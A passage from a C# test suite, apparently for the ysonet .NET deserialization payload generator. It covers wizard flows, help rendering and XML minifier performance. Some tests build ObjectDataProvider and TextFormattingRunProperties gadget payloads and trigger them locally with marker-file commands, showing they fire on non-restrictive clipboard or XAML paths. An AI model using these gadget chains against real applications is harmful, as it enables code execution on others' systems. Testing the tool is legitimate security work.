            keys.Type("formatter").Enter().Digit(2);      // Json.NET
            keys.Type("command").Enter().TypeLine("notepad.exe");
            keys.Type("Generate").Enter();
            keys.Escape();                                // leave form -> module list
            // flow 2: ODP again, command left at the remembered default
            keys.Type("ObjectDataProvider").Enter();
            keys.Type("formatter").Enter().Digit(2);      // Json.NET
            keys.Type("Generate").Enter();
            keys.Escape();                                // leave form -> module list
            keys.Escape();                                // leave module list -> top
            keys.Escape();                                // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] one = GenerateOdpJson("notepad.exe");

            AssertEqual(one.Length * 2, got.Length, "two payloads emitted back to back");
            byte[] first = new byte[one.Length];
            byte[] second = new byte[one.Length];
            Array.Copy(got, 0, first, 0, one.Length);
            Array.Copy(got, one.Length, second, 0, one.Length);
            AssertTrue(BytesEqual(first, one), "first payload uses the typed command");
            AssertTrue(BytesEqual(second, one), "second payload reused the remembered command");
        }

        private static void WizardRunAllFormatters()
        {
            // The reported bug: this sweep exited the wizard because some gadgets
            // reject a shell command (they expect a file/URL/DLL). It must now run
            // to completion, skip those gracefully, and emit nothing to stdout.
            var keys = new ScriptedKeyReader();
            keys.Digit(4);                     // top menu -> Run all formatters (index 3)
            keys.Enter();                      // input type -> Shell command (index 0)
            keys.Type("BinaryFormatter").Enter(); // formatter picker filter + pick
            keys.TypeLine("calc.exe");         // command
            keys.Enter();                      // output format -> auto
            keys.Digit(3);                     // destination -> "Just show payload lengths" (index 2)
            keys.Escape();                     // back at top menu -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "sweep writes nothing to stdout");
            AssertTrue(stderr.Contains("Shell command ("), "input types listed with gadget counts");
            AssertTrue(stderr.Contains("Done."), "sweep ran to completion");
            AssertTrue(stderr.Contains("will run with"), "non-empty gadget set previewed before running");
            AssertTrue(stderr.Contains("[ok]"), "at least one gadget generated");
            AssertTrue(!stderr.Contains("length 0"), "empty payloads are skipped, not counted as ok");
        }

        private static void WizardRunAllFormattersToFolder()
        {
            string folder = Path.Combine(Path.GetTempPath(), "ysonet_raf_test");
            if (Directory.Exists(folder))
                Directory.Delete(folder, true);

            var keys = new ScriptedKeyReader();
            keys.Digit(4);                     // top -> Run all formatters
            keys.Enter();                      // input type -> Shell command (index 0)
            keys.Type("BinaryFormatter").Enter(); // formatter picker filter + pick
            keys.TypeLine("calc.exe");         // command
            keys.Enter();                      // output format -> auto
            keys.Digit(1);                     // destination -> "Save each to its own file" (index 0)
            keys.TypeLine(folder);             // folder path
            keys.Escape();                     // back at top -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "sweep writes nothing to stdout");
            AssertTrue(Directory.Exists(folder), "output folder created");
            string[] files = Directory.GetFiles(folder);
            AssertTrue(files.Length > 0, "payload files were written");
            long biggest = 0;
            foreach (string p in files)
            {
                long n = new FileInfo(p).Length;
                if (n > biggest) biggest = n;
            }
            AssertTrue(biggest > 0, "written payloads are non-empty");

            // Variant-capable gadgets that support BinaryFormatter (e.g.
            // GenericPrincipal, GetterSecurityException) emit one file per variant.
            bool anyVariantFile = false;
            foreach (string p in files)
                if (Path.GetFileName(p).Contains("_v"))
                    anyVariantFile = true;
            AssertTrue(anyVariantFile, "variant-suffixed files were produced");

            try { Directory.Delete(folder, true); } catch { }
        }

        private static void ClipboardWpfXamlOptions()
        {
            // The new delivery mode must be reachable through the plugin's own
            // OptionSet, which is what the CLI parses and the wizard introspects.
            var plugin = new ClipboardPlugin();
            var fields = OptionField.FromOptionSet(plugin.Options());

            OptionField modeField = FindField(fields, "mode");
            AssertTrue(modeField != null, "mode option present");
            AssertTrue(modeField.TakesValue, "mode takes a value");
            AssertEqual("m", modeField.ShortName, "mode has -m short name");

            OptionField variantField = FindField(fields, "xamlvariant");
            AssertTrue(variantField != null, "xamlvariant option present");
            AssertTrue(variantField.TakesValue, "xamlvariant takes a value");

            // The original winforms knobs are still there (mode is additive).
            AssertTrue(FindField(fields, "format") != null, "format option still present");
            AssertTrue(FindField(fields, "command") != null, "command option still present");
        }

        // Triggering harness: build each Clipboard delivery payload exactly as the
        // plugin does, then drive the target's deserialization/paste path and prove
        // the command fired (a marker file only a fired gadget could create). This
        // runs the payload locally, like the plugin's own --test - the authorized
        // self-test of an offensive tool.
        private static void ClipboardPayloadsTrigger()
        {
            // winforms delivery: AxHost.State -> BinaryFormatter TextFormattingRunProperties.
            AssertTrue(WinformsPayloadTriggers(),
                "winforms clipboard payload triggers the command on BinaryFormatter deserialization");

            // wpfxaml, both XAML variants: they must FIRE on the vulnerable
            // (non-restrictive) paste path...
            AssertTrue(WpfXamlPayloadRuns(1, false), "wpfxaml variant 1 triggers on a non-restrictive paste");
            AssertTrue(WpfXamlPayloadRuns(2, false), "wpfxaml variant 2 triggers on a non-restrictive paste");
            // ...and must be BLOCKED on the mitigated (restrictive) default paste.
            AssertTrue(!WpfXamlPayloadRuns(1, true), "wpfxaml variant 1 is blocked on a restrictive paste");
            AssertTrue(!WpfXamlPayloadRuns(2, true), "wpfxaml variant 2 is blocked on a restrictive paste");
        }

        private static bool WinformsPayloadTriggers()
        {
            string marker = Path.Combine(Path.GetTempPath(), "ysonet_clip_winforms.txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
            ia.IsRawCmd = true;

            // Same object the plugin puts on the clipboard for winforms delivery.
            object gadget = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(ia);
            AxHostStateMarshal marshal = new AxHostStateMarshal(gadget);

            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            byte[] bytes;
            using (var ms = new MemoryStream()) { bf.Serialize(ms, marshal); bytes = ms.ToArray(); }

            // A target reading GetData(format) deserializes it with BinaryFormatter.
            RunSTA(delegate { using (var ms = new MemoryStream(bytes)) { bf.Deserialize(ms); } });

            bool ran = WaitForFile(marker, 2500);
            if (File.Exists(marker)) File.Delete(marker);
            return ran;
        }

        private static bool WpfXamlPayloadRuns(int variant, bool restrictive)
        {
            string marker = Path.Combine(Path.GetTempPath(),
                "ysonet_clip_wpf_" + variant + "_" + (restrictive ? "r" : "n") + ".txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
            ia.IsRawCmd = true;

            // Same XAML the plugin places under the WPF 'Xaml' clipboard format.
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new string[] { "--variant", variant.ToString() });
            string xaml = (string)gen.Generate("xaml", ia);

            RunSTA(delegate
            {
                if (restrictive) SerializersHelper.Xaml_deserialize_restrictive(xaml);
                else SerializersHelper.Xaml_deserialize(xaml);
            });

            bool ran = WaitForFile(marker, 2500);
            if (File.Exists(marker)) File.Delete(marker);
            return ran;
        }

        // Run an action on an STA thread (WPF XamlReader and WinForms deserialization
        // expect it). Swallows exceptions: a gadget may throw after it fires, so the
        // marker file, not the return, is the proof.
        private static void RunSTA(System.Threading.ThreadStart action)
        {
            var t = new System.Threading.Thread(delegate ()
            {
                try { action(); }
                catch (Exception) { }
            });
            t.SetApartmentState(System.Threading.ApartmentState.STA);
            t.Start();
            t.Join();
        }

        private static bool WaitForFile(string path, int totalMs)
        {
            int waited = 0;
            while (waited < totalMs)
            {
                if (File.Exists(path)) return true;
                System.Threading.Thread.Sleep(100);
                waited += 100;
            }
            return File.Exists(path);
        }

        private static void RestrictiveXamlBlocksGadget()
        {
            // The wpfxaml mode's --test relies on this: the restrictive reader (the
            // default WPF paste path since the CVE-2020-0605/0606 mitigation) must
            // block the ObjectDataProvider gadget so the command does NOT run. On a
            // mitigated framework it blocks silently (no throw); older ones may throw.
            // Either way the gadget must not execute, so we assert on a marker file
            // that only a fired gadget would create, not on an exception.
            string marker = Path.Combine(Path.GetTempPath(), "ysonet_restrictive_xaml_test.txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo blocked > \"" + marker + "\"";
            ia.IsRawCmd = true;
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new string[] { "--variant", "2" });
            string xaml = (string)gen.Generate("xaml", ia);

            AssertTrue(xaml.Contains("ObjectDataProvider"), "payload is an ObjectDataProvider gadget");
            AssertTrue(xaml.Contains("ResourceDictionary"), "variant 2 is a ResourceDictionary wrapper");

            try { SerializersHelper.Xaml_deserialize_restrictive(xaml); }
            catch (Exception) { /* some frameworks throw when blocking; that is still a block */ }

            System.Threading.Thread.Sleep(300);
            bool ran = File.Exists(marker);
            if (ran) File.Delete(marker);
            AssertTrue(!ran, "restrictive XAML load must block the gadget (marker must not be created)");
        }

        // Guards the whole CLI --help/--fullhelp surface against the NDesk.Options
        // wrap-loop hang (see Helpers/HelpText.cs). It renders every plugin's and
        // gadget's option help through the production HelpText path on a worker
        // thread with a timeout. Before the fix, "ysonet.exe -p clipboard --help"
        // spun forever inside WriteOptionDescriptions; this fails instead of hanging
        // if any option description ever regresses that way again.
        private static void OptionHelpNeverHangs()
        {
            var sets = new List<KeyValuePair<string, OptionSet>>();

            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                OptionSet o = g == null ? null : g.Options();
                if (o != null) sets.Add(new KeyValuePair<string, OptionSet>("gadget " + name, o));
            }
            foreach (string name in PluginRegistry.GetAllPluginNames())
            {
                IPlugin p = PluginRegistry.CreatePluginInstance(name);
                OptionSet o = p == null ? null : p.Options();
                if (o != null) sets.Add(new KeyValuePair<string, OptionSet>("plugin " + name, o));
            }

            AssertTrue(sets.Count > 0, "found plugin/gadget option sets to render");

            foreach (KeyValuePair<string, OptionSet> kv in sets)
            {
                OptionSet opts = kv.Value;
                Exception err = null;
                StringWriter sw = new StringWriter();
                System.Threading.Thread t = new System.Threading.Thread(delegate ()
                {
                    try { HelpText.WriteOptionDescriptions(opts, sw); }
                    catch (Exception e) { err = e; }
                });
                t.IsBackground = true; // a genuine hang must not keep the test process alive
                t.Start();
                bool done = t.Join(System.TimeSpan.FromSeconds(10));
                AssertTrue(done, "option help render hung (NDesk wrap loop) for " + kv.Key);
                AssertTrue(err == null, "option help render threw for " + kv.Key + ": " + (err == null ? "" : err.Message));
                // The render must actually produce help text (it has at least one option).
                AssertTrue(sw.ToString().Trim().Length > 0, "option help produced output for " + kv.Key);
            }
        }

        // Unit test for the soft-break that makes the render safe. A whitespace-free
        // token longer than the NDesk wrap width is what triggers the loop, so
        // SoftBreak must shrink every run to the safe width while only inserting
        // spaces (never dropping or changing characters).
        private static void SoftBreakWrapsLongTokens()
        {
            // The real clipboard --mode token that caused the hang.
            string token = "Switch.System.Windows.EnableLegacyDangerousClipboardDeserializationMode=true";
            AssertTrue(HelpText.LongestUnbrokenRun(token) > HelpText.MaxTokenLength,
                "sample token is long enough to trigger the NDesk hang");

            string broken = HelpText.SoftBreak(token);
            AssertTrue(HelpText.LongestUnbrokenRun(broken) <= HelpText.MaxTokenLength,
                "soft-break keeps every run within the safe wrap width");
            AssertEqual(token, broken.Replace(" ", ""),
                "soft-break only inserts spaces; all original characters are kept");

            // Text that already wraps is returned untouched.
            string ok = "a normal help line with short words";
            AssertEqual(ok, HelpText.SoftBreak(ok), "short text is returned unchanged");
            AssertEqual("", HelpText.SoftBreak(""), "empty text is safe");
            AssertEqual(null, HelpText.SoftBreak(null), "null text is safe");
        }

        // Correctness lock for the XmlMinifier "remove soap encodingStyle" fix in
        // XmlParserNamespaceMinifier: the tighter NCName prefix class must still strip a real
        // soap-envelope encodingStyle, and must still leave a non-soap encodingStyle alone.
        // (The performance side of that fix, and the XSLT namespace fix, are locked by
        // XmlMinifierScalesOnBigPayload below.) These run on fixed strings, no compile.
        private static void XmlMinifierEncodingStyle()
        {
            // 1) Soap encodingStyle IS still removed: the tighter class matches a real
            // soap-envelope prefix identically. Declare SOAP-ENV as the soap-envelope
            // namespace and put encodingStyle on an element; the minified output must not
            // contain "encodingStyle" any more.
            string soapDoc =
                "<root xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                + "<item SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">x</item></root>";
            string soapResult = XmlMinifier.Minify(soapDoc, null, null);
            AssertTrue(soapResult.IndexOf("encodingStyle", StringComparison.Ordinal) < 0,
                "soap-envelope encodingStyle is stripped by the minifier");

            // 2) A NON soap-envelope encodingStyle is preserved: only the soap-envelope one
            // is stripped. foo maps to a non-soap namespace, so its encodingStyle stays.
            string nonSoapDoc =
                "<root xmlns:foo=\"http://example.com/notsoap\">"
                + "<item foo:encodingStyle=\"http://example.com/enc\">x</item></root>";
            string nonSoapResult = XmlMinifier.Minify(nonSoapDoc, null, null);
            AssertTrue(nonSoapResult.IndexOf("encodingStyle", StringComparison.Ordinal) >= 0,
                "a non soap-envelope encodingStyle attribute is left untouched");
        }

        // Big-payload performance lock for XmlMinifier. This is the shape the file gadgets
        // (DataSetOldBehaviourFromFile and friends) embed: a ResourceDictionary whose
        // ObjectDataProvider carries the inline compiled assembly as a long whitespace-free
        // run of <s:Byte> elements. Two separate O(n^2) bugs used to make minifying it blow
        // up (DataSetOldBehaviourFromFile --minify was ~112s at a small size, ~200s+ at a
        // larger one):
        //   1. the "remove soap encodingStyle" regex backtracked over the whitespace-free run
        //      (fixed with a guard + a tighter prefix class), and
        //   2. the XSLT "drop unused namespaces" pass ran a //* document scan once per element
        //      for the reserved xml namespace, which is O(elements^2) (fixed by excluding the
        //      xml namespace, a no-op for the output).
        // Both bugs make this run far longer than the backstop, so the test would fail fast on
        // a regression. It is a genuinely BIG payload (tens of thousands of elements) so the
        // quadratic behaviour, not just a constant, is what is measured. Runs on a background
        // thread with a wall-clock backstop, same shape as OptionHelpNeverHangs.
        private static void XmlMinifierScalesOnBigPayload()
        {
            // ~30000 byte elements (~0.5 MB). Whitespace-free, exactly like the real encoder
            // output. All of the declared prefixes (default, x, s, r) ARE used, so only the
            // fixed code keeps the pass linear; a regression of either O(n^2) bug hangs it.
            StringBuilder bytes = new StringBuilder();
            for (int i = 0; i < 30000; i++) bytes.Append("<s:Byte>77</s:Byte>");
            string bigResourceDict =
                "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\""
                + " xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\""
                + " xmlns:s=\"clr-namespace:System;assembly=mscorlib\""
                + " xmlns:r=\"clr-namespace:System.Reflection;assembly=mscorlib\">"
                + "<ObjectDataProvider x:Key=\"asmLoad\" ObjectType=\"{x:Type r:Assembly}\" MethodName=\"Load\">"
                + "<x:Array Type=\"s:Byte\">" + bytes + "</x:Array>"
                + "</ObjectDataProvider></ResourceDictionary>";

            string result = null;
            Exception threadErr = null;
            System.Threading.Thread t = new System.Threading.Thread(delegate ()
            {
                try { result = XmlMinifier.Minify(bigResourceDict, null, null); }
                catch (Exception e) { threadErr = e; }
            });
            t.IsBackground = true; // a genuine hang must not keep the test process alive
            t.Start();
            bool done = t.Join(System.TimeSpan.FromSeconds(20));
            AssertTrue(done, "XmlMinifier hung on a big inline-assembly payload (O(n^2) regression in the encodingStyle scan or the XSLT namespace pass)");
            AssertTrue(threadErr == null, "XmlMinifier threw on a big inline-assembly payload: " + (threadErr == null ? "" : threadErr.Message));
            AssertTrue(!string.IsNullOrEmpty(result), "big-payload minify produced a non-empty result");
            // The payload must survive: still well-formed XML and still carrying the byte array.
            System.Xml.XmlDocument parsed = new System.Xml.XmlDocument();
            parsed.LoadXml(result);
            AssertTrue(result.IndexOf("Byte", StringComparison.Ordinal) >= 0,
                "the minified big payload still contains its byte array");
        }

        // Performance lock for the XmlDirtyMatchReplaceMinifier "remove spaces around
        // separators" pass (the third regex). It used to be O(n^2) on a long whitespace-free
        // run of class characters inside a quoted attribute (the ApplicationTrust hex
        // Data="..." shape): the greedy class run was consumed from every start position and
        // then failed to find a ';'/','. The plain XmlMinifierScalesOnBigPayload above does
        // NOT catch this, because its <s:Byte> run is broken by '<'/'>' every few chars, so no
        // single class-run is long. This test fires the exact worst case. Two payloads lock
        // the two independent fix mechanisms:
        //   GUARD path: no ';'/',' anywhere, so the whole block is skipped. A lookbehind-only
        //     revert still passes this; a guard revert would still be linear thanks to the
        //     lookbehind, so this case mainly exercises the guard's fast path.
        //   LOOKBEHIND path: a comma is present, so the guard does NOT skip the block. Only the
        //     negative-lookbehind anchor keeps the big run linear here; a lookbehind revert
        //     reintroduces the O(n^2) blow-up and this case would exceed the backstop.
        // Both are ~40s+ on the pre-fix code and near-instant on the fixed code, so a real
        // regression fails fast. Background thread + 20s wall-clock backstop, same shape as
        // XmlMinifierScalesOnBigPayload.
        private static void XmlMinifierDirtyMatchScalesOnHexAttribute()
        {
            string bigRun = new string('A', 40000);

            // GUARD path: one long whitespace-free run, no ';'/',' anywhere, terminated by '"'.
            string guardDoc = "<ExtraInfo Data=\"" + bigRun + "\"></ExtraInfo>";
            RunMinifyWithBackstop(guardDoc, "guard path (pure hex, no ';'/',')");

            // LOOKBEHIND path: same big run, but a comma elsewhere means the guard cannot skip
            // the block, so only the lookbehind keeps it linear. Wrapped in a single root so it
            // is well-formed XML for the XSLT pass.
            string lookbehindDoc = "<root><n Type=\"x, Version=1\"/><ExtraInfo Data=\"" + bigRun + "\"></ExtraInfo></root>";
            RunMinifyWithBackstop(lookbehindDoc, "lookbehind path (big run + a comma elsewhere)");
        }

        // Helper: run XmlMinifier.Minify on a background thread with a 20s wall-clock backstop
        // and assert it finished, did not throw, is non-empty, and still carries its big run.
        private static void RunMinifyWithBackstop(string doc, string label)
        {
            string result = null;
            Exception threadErr = null;
            System.Threading.Thread t = new System.Threading.Thread(delegate ()
            {
                try { result = XmlMinifier.Minify(doc, null, null); }
                catch (Exception e) { threadErr = e; }
            });
            t.IsBackground = true; // a genuine hang must not keep the test process alive
            t.Start();
            bool done = t.Join(System.TimeSpan.FromSeconds(20));
            AssertTrue(done, "XmlMinifier dirty-match pass hung on the " + label + " (O(n^2) regression in the separator regex)");
            AssertTrue(threadErr == null, "XmlMinifier threw on the " + label + ": " + (threadErr == null ? "" : threadErr.Message));
            AssertTrue(!string.IsNullOrEmpty(result), "dirty-match minify produced a non-empty result on the " + label);
            AssertTrue(result.IndexOf(new string('A', 1000), StringComparison.Ordinal) >= 0,
                "the minified payload still contains its big run on the " + label);
        }

        // Output-equivalence lock for the XmlDirtyMatchReplaceMinifier guard+lookbehind fix.
        // The golden strings were captured from the CURRENT pre-fix build (before the fix was
        // applied), so an exact match proves the fix did not change any real minifier output.
        // These are the exact shapes the fix's correctness argument reasons about: assembly
        // qualified names, clr-namespace, the { x:Type } markup extension, a method signature,
        // a spaced list, and a pure-hex attribute (the guard path). Fixed strings, no compile.
        private static void XmlMinifierDirtyMatchOutputUnchanged()
        {
            // Assembly-qualified name with commas: spaces after the commas are removed.
            AssertEqual(
                "<r Type=\"Microsoft.IdentityModel,Version=3.5.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35\"/>",
                XmlMinifier.Minify("<r Type=\"Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\"/>", null, null),
                "AQN commas minify unchanged");

            // clr-namespace with a semicolon separator: space after ';' removed.
            AssertEqual(
                "<r Type=\"clr-namespace:System.Diagnostics;assembly=system\"/>",
                XmlMinifier.Minify("<r Type=\"clr-namespace:System.Diagnostics; assembly=system\"/>", null, null),
                "clr-namespace semicolon minify unchanged");

            // { x:Type Diag:Process } markup extension: braces tightened, inner space kept.
            AssertEqual(
                "<r Value=\"{x:Type Diag:Process}\"/>",
                XmlMinifier.Minify("<r Value=\"{ x:Type Diag:Process }\"/>", null, null),
                "x:Type markup extension minify unchanged");

            // Method signature with a comma: unchanged, because the ')' terminator is not in the
            // regex's terminator class, so the pre-fix regex never matched it either.
            AssertEqual(
                "<r Sig=\"Int32 Compare(System.String, System.String)\"/>",
                XmlMinifier.Minify("<r Sig=\"Int32 Compare(System.String, System.String)\"/>", null, null),
                "method signature minify unchanged");

            // Spaced list with both separators: all spaces removed.
            AssertEqual(
                "<r List=\"foo,bar;baz\"/>",
                XmlMinifier.Minify("<r List=\"foo , bar ; baz\"/>", null, null),
                "spaced list minify unchanged");

            // Pure-hex attribute, no ';'/',' (guard path): passes through unchanged.
            AssertEqual(
                "<r Data=\"AABBCCDDEEFF00112233445566778899\"/>",
                XmlMinifier.Minify("<r Data=\"AABBCCDDEEFF00112233445566778899\"/>", null, null),
                "pure-hex attribute minify unchanged (guard path)");
        }

        // Locks the leading-space trim added to XmlDirtyMatchReplaceMinifier's space-removal
        // delegate. The outer assembly of a generic type is emitted with a space after the
        // closing brackets, e.g. "]], System.Data.Services". The run match starts right after
        // those brackets, so the three original passes (each needs a captured char on the space's
        // left) cannot reach it; only the new leading-space trim removes it. The other
        // assembly-name shapes stay byte-identical (see XmlMinifierDirtyMatchOutputUnchanged).
        private static void XmlMinifierTrimsLeadingSpaceInGenericTypeName()
        {
            string input = "<root type=\"A`2[[X, PF, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>";
            string result = XmlMinifier.Minify(input, null, null);
            AssertTrue(result.IndexOf("]],System.Data.Services,", StringComparison.Ordinal) >= 0,
                "leading space after the generic ']]' is trimmed: " + result);
            AssertTrue(result.IndexOf("]], System", StringComparison.Ordinal) < 0,
                "no space survives after the generic brackets: " + result);
            AssertTrue(XmlWellFormednessError(result) == null,
                "trimmed output stays well-formed XML: " + result);
        }

        // Locks the namespace cleanup XmlDirtyMatchReplaceMinifier runs after the discardable
        // regexes. A discard can delete the only use of a namespace, and the XSLT unused-namespace
        // pass has already run by then, so the minifier re-runs it to drop the now-orphaned
        // declaration. Also verifies the guard: a discard that leaves non-well-formed XML (a
        // stripped closing tag, as ResourceSet does deliberately) must not throw and must keep
        // the discarded text.
        private static void XmlMinifierRemovesNamespaceOrphanedByDiscard()
        {
            string input = "<root xmlns:p=\"http://keep.example/ns\" xmlns:q=\"http://drop.example/ns\"><p:Keep>x</p:Keep><q:Drop Marker=\"y\"/></root>";

            // (a) Discard the only element that uses the 'q' namespace; its xmlns must be dropped
            // while the still-used 'p' namespace stays, and the result must remain well-formed.
            string orphaned = XmlMinifier.Minify(input, null, new string[] { "<[a-zA-Z]:Drop[^>]*/>" });
            AssertTrue(orphaned.IndexOf("http://keep.example/ns", StringComparison.Ordinal) >= 0,
                "still-used namespace is kept: " + orphaned);
            AssertTrue(orphaned.IndexOf("http://drop.example/ns", StringComparison.Ordinal) < 0,
                "orphaned namespace is removed after the discard: " + orphaned);
            AssertTrue(XmlWellFormednessError(orphaned) == null,
                "orphan-cleaned output is well-formed XML: " + orphaned);

            // (b) A discard that removes a closing tag leaves malformed XML on purpose; the
            // re-parse is guarded, so Minify must not throw and must keep the discarded result.
            string malformed = null;
            bool threw = false;
            try { malformed = XmlMinifier.Minify(input, null, new string[] { "</root>" }); }
            catch { threw = true; }
            AssertTrue(!threw, "a discard that breaks well-formedness must not throw");
            AssertTrue(malformed != null && malformed.IndexOf("</root>", StringComparison.Ordinal) < 0,
                "the closing-tag discard was applied: " + malformed);
            AssertTrue(malformed != null && malformed.IndexOf("Keep", StringComparison.Ordinal) >= 0,
                "surviving content is kept after the guarded re-parse: " + malformed);
        }

        // Locks the DataSetOldBehaviourFromFile --compressed option (GZip-in-payload). The
        // compressed payload must be smaller than the plain inline-byte-array form AND carry the
        // GZipStream decompress chain that reconstitutes the assembly at deserialization time.
        // End-to-end execution of the compressed payload is covered by PayloadsFireIntoTestSinks.
        private static void DataSetFromFileCompressedIsSmaller()
        {
            string cs = Path.Combine(Path.GetTempPath(), "ysonet_dsff_compress_fixture.cs");
            File.WriteAllText(cs, "public class YsonetCompressFixture { public YsonetCompressFixture() { } }");
            try
            {
                byte[] plain = GenerateDsffFromFile(cs, false);
                byte[] compressed = GenerateDsffFromFile(cs, true);
                AssertTrue(plain != null && plain.Length > 0, "uncompressed DataSetFromFile generates");
                AssertTrue(compressed != null && compressed.Length > 0, "compressed DataSetFromFile generates");
                AssertTrue(compressed.Length < plain.Length,
                    "compressed payload is smaller (" + compressed.Length + " vs " + plain.Length + " bytes)");
                AssertTrue(BytesContainAscii(compressed, "GZipStream"),
                    "compressed payload carries the GZipStream decompress chain");
                AssertTrue(!BytesContainAscii(plain, "GZipStream"),
                    "the plain payload does not use GZipStream");
            }
            finally { try { File.Delete(cs); } catch { } }
        }

        // Generate a DataSetOldBehaviourFromFile BinaryFormatter payload from a .cs file,
        // optionally with --compressed. Returns the raw bytes (null on failure).
        private static byte[] GenerateDsffFromFile(string csPath, bool compressed)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = csPath;
            ia.Minify = true;
            if (compressed) ia.ExtraArguments = new List<string> { "--compressed" };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "DataSetOldBehaviourFromFile",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            };
            RunResult r = PayloadRunner.GenerateGadget(req);
            return r.Success ? (r.Raw as byte[]) : null;
        }

        // True if the ASCII bytes of `needle` appear anywhere in `hay` (the XAML inside a BF blob
        // is stored as ASCII, so its element names are byte-searchable without decoding the blob).
        private static bool BytesContainAscii(byte[] hay, string needle)
        {
            if (hay == null) return false;
            byte[] n = Encoding.ASCII.GetBytes(needle);
            for (int i = 0; i + n.Length <= hay.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < n.Length; j++) { if (hay[i + j] != n[j]) { ok = false; break; } }
                if (ok) return true;
            }
            return false;
        }

        // Locks the compact byte-array encoding. An inline byte array in XAML/XmlSerializer used
        // to spend "<s:Byte>N</s:Byte>" (19 chars) per byte; declaring the System namespace as
        // the default on the array lets each element be the bare "<Byte>N</Byte>" (15 chars),
        // saving 4 bytes per array element. On payloads that embed a whole assembly that is
        // several KB. XmlByteArrayEncoder is the shared helper; here we lock the tag it emits.
        private static void ByteArrayEncoderEmitsBareTag()
        {
            byte[] b = new byte[] { 1, 2, 255 };
            string bare = XmlByteArrayEncoder.ConvertBytesToArrayOfUnsignedByteXML(b, "Byte", "", "");
            AssertEqual("<Byte>1</Byte><Byte>2</Byte><Byte>255</Byte>", bare, "encoder emits the compact bare <Byte> tag");
            // The prefixed form must still be available for callers that need it.
            string prefixed = XmlByteArrayEncoder.ConvertBytesToArrayOfUnsignedByteXML(b, "s:Byte", "", "");
            AssertEqual("<s:Byte>1</s:Byte><s:Byte>2</s:Byte><s:Byte>255</s:Byte>", prefixed, "encoder still supports a prefixed tag");
        }

        // Locks the compact byte array in the GetterSettingsPropertyValue Xaml payload (the
        // tool's largest payload): bare <Byte> children under an <assembly:Array> that declares
        // the System namespace as its default, instead of an "s:" prefix on every byte. The
        // command is only a string here; generation never executes it. The end-to-end firing is
        // covered by the FULL PayloadsFireIntoTestSinks matrix.
        private static void GspvXamlUsesCompactByteArray()
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe"; // command string only; generation does not run it
            ia.Minify = true;
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "GetterSettingsPropertyValue",
                FormatterName = "Xaml",
                OutputFormat = "",
                InputArgs = ia,
            };
            RunResult r = PayloadRunner.GenerateGadget(req);
            AssertTrue(r.Success, "gspv Xaml generates: " + r.ErrorMessage);
            string xaml = r.Raw as string;
            AssertTrue(!string.IsNullOrEmpty(xaml), "gspv Xaml is a non-empty string");
            AssertTrue(xaml.IndexOf("<Byte>", StringComparison.Ordinal) >= 0,
                "gspv uses the bare <Byte> element (compact form)");
            AssertTrue(xaml.IndexOf("<s:Byte>", StringComparison.Ordinal) < 0,
                "gspv no longer uses the wasteful <s:Byte> prefix on every byte");
            AssertTrue(xaml.IndexOf("Type=\"s:Byte\" xmlns=\"clr-namespace:System;assembly=mscorlib\"", StringComparison.Ordinal) >= 0,
                "the byte array declares the System namespace as its default so bare <Byte> resolves");
            AssertTrue(XmlWellFormednessError(xaml) == null, "gspv Xaml stays well-formed XML");
        }

        // Every gadget must actually produce a non-empty payload from valid inputs,
        // not merely declare that it supports a formatter. Data-driven, so a newly
        // added gadget is covered automatically. For each gadget it picks a sample
        // input matching the gadget's declared CommandInput() and generates with the
        // gadget's first supported formatter. (The CLI's --raf sweeps every formatter;
        // this is the per-gadget smoke test that each one can generate at all.)
        private static void EveryGadgetGeneratesAPayload()
        {
            // Fixtures for the file/dll/source input types.
            string csFixture = Path.Combine(Path.GetTempPath(), "ysonet_gadget_fixture.cs");
            File.WriteAllText(csFixture, "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            // A real managed PE for gadgets that embed a DLL to load on the target.
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;

            try
            {
                string[] names = GadgetRegistry.GetAllGadgetNames();
                AssertTrue(names.Length > 0, "found gadgets to generate");

                foreach (string name in names)
                {
                    // "Generic" is the base generator, not a real gadget (the CLI hides
                    // it too); it has no payload to produce.
                    if (name == "Generic") continue;

                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                    AssertTrue(g != null, "gadget loads: " + name);

                    List<string> formatters = g.SupportedFormatters();
                    AssertTrue(formatters != null && formatters.Count > 0, name + " declares a formatter");

                    // SupportedFormatters() entries may carry display annotations
                    // ("Xaml (4)", "YamlDotNet < 5.0.0"); the real -f name is the first
                    // whitespace-delimited token (see GenericGenerator.IsSupported).
                    string formatter = formatters[0].Split(' ')[0];

